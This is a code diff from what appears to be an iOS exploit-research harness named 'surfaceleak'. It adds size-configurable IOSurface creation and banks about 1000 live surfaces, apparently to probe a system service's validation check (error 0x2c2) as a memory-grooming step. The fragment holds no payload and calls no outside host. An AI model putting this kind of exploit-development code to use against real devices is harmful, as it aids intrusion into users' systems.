@@ -32,7 +32,7 @@
 #import "LabLocalTime.h"
 #import "LabRuntimeOffsets.h"
 
-#define P114_BUILD @"p114-surfaceleak-v1.14-sidin"
+#define P114_BUILD @"p114-surfaceleak-v1.5-banksize"
 
 #import <Foundation/Foundation.h>
 #import <CoreFoundation/CoreFoundation.h>
@@ -147,6 +147,40 @@ static BOOL p114_dlsym(void) {
 /* one benign surface per capture = a fresh event for the serializer.
    Keys via CFStringCreateWithCString (the p098 v4 law: no dlsym'd
    kIOSurface* bridges — the realizeClass SIGBUS class).                  */
+/* v1.5 BANK-SIZE LAW: the v5 contract's consumer validates sid->IOSurface
+   AND size-vs-expected (the v52 law). The Oct-29/30 rounds sent 1000 REAL
+   distinct live surfaces and still got 0x2c2 => the bank was NOT the gate
+   by ID — the remaining candidate = GEOMETRY. The old bank = 1024 B
+   surfaces; the staging law's live-queue expected buffer = 0x4000
+   (16384 B). Documents/p114_bankbytes.txt = decimal byte size per banked
+   surface (clamped 4096..1048576); default stays 1024 (the old law).    */
+static NSInteger g_p114_bankbytes = 1024;
+
+static p114_SurfaceRef p114_mk_surface_bytes(NSInteger bytes) {
+    if (!g_p114_surfCreate) return NULL;
+    if (bytes % 4) return NULL;
+    NSInteger w = bytes / 4, bpe = 4, bpr = bytes, h = 1, alloc = bytes;
+    CFMutableDictionaryRef props = CFDictionaryCreateMutable(kCFAllocatorDefault, 5,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    static const char *keyNames[5] = { "IOSurfaceWidth", "IOSurfaceHeight",
+                                       "IOSurfaceBytesPerElement",
+                                       "IOSurfaceBytesPerRow",
+                                       "IOSurfaceAllocSize" };
+    const NSInteger vals[5] = { w, h, bpe, bpr, alloc };
+    for (int i = 0; i < 5; i++) {
+        CFStringRef key = CFStringCreateWithCString(kCFAllocatorDefault,
+                                                    keyNames[i], kCFStringEncodingUTF8);
+        CFNumberRef num = CFNumberCreate(kCFAllocatorDefault,
+                                         kCFNumberNSIntegerType, &vals[i]);
+        if (key && num) CFDictionarySetValue(props, key, num);
+        if (key) CFRelease(key);
+        if (num) CFRelease(num);
+    }
+    p114_SurfaceRef s = g_p114_surfCreate((CFDictionaryRef)props);
+    CFRelease(props);
+    return s;
+}
+
 static p114_SurfaceRef p114_mk_surface(void) {
     if (!g_p114_surfCreate) return NULL;
     CFMutableDictionaryRef props = CFDictionaryCreateMutable(kCFAllocatorDefault, 5,
@@ -293,8 +327,28 @@ static void p114_hexdump(size_t maxn) {
         int nbank = 0;
         memset(p114_sids, 0, sizeof(p114_sids));
         memset(p114_bank, 0, sizeof(p114_bank));
+        /* v1.5: the bank-size flag (the 2c2 third-layer geometry test) */
+        {
+            NSString *bpath = [[NSString alloc] initWithContentsOfFile:
+                [[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
+                 NSUserDomainMask, YES) firstObject]
+                 stringByAppendingPathComponent:@"p114_bankbytes.txt"]
+                              encoding:NSUTF8StringEncoding error:nil];
+            NSString *t = [bpath stringByTrimmingCharactersInSet:
+                [NSCharacterSet whitespaceAndNewlineCharacterSet]];
+            if (t.length) {
+                NSInteger bs = (NSInteger)t.integerValue;
+                if (bs >= 4096 && bs <= 1048576 && bs % 4 == 0) {
+                    g_p114_bankbytes = bs;
+                    Lf(@"[v1.5] BANK-SIZE LAW: %ld bytes per banked surface "
+                       @"(%ldx1 @4BPE, the 0x4000-class geometry candidate "
+                       @"for the 2c2 third-layer gate)",
+                       (long)bs, (long)(bs / 4));
+                }
+            }
+        }
         while (nbank < 1000) {
-            p114_SurfaceRef s = p114_mk_surface();
+            p114_SurfaceRef s = p114_mk_surface_bytes(g_p114_bankbytes);
             if (!s) break;
             uint32_t sid = g_p114_surfID ? g_p114_surfID((void *)s) : 0;
             if (!sid) { if (g_p114_surfRel) g_p114_surfRel(s); continue; }
